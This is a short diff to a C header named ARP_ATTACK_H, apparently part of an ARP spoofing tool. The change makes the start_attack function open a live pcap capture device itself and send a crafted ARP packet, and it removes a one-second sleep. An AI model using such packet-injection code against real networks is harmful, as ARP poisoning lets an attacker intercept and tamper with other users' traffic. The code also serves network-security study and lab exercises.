@@ -37,12 +37,18 @@ void make_arp_packet(uint32_t senderIP, uint8_t * sender_mac, ARP_Packet * packe
     packet->arp.target_ip = targetIP;
 }
 
-void start_attack(u_char * arp_pkt, char * dev, pcap_t * handle){
+void start_attack(u_char * arp_pkt, char * dev){
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+
+    if (handle == NULL) {
+        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
+        return;
+    }
     if(pcap_sendpacket(handle, arp_pkt, sizeof(unsigned char)*50)!=0){
         printf("couldn't send pkt\n");
         exit(0);
     }
-    usleep(1000000);
 }
 
 #endif // ARP_ATTACK_H
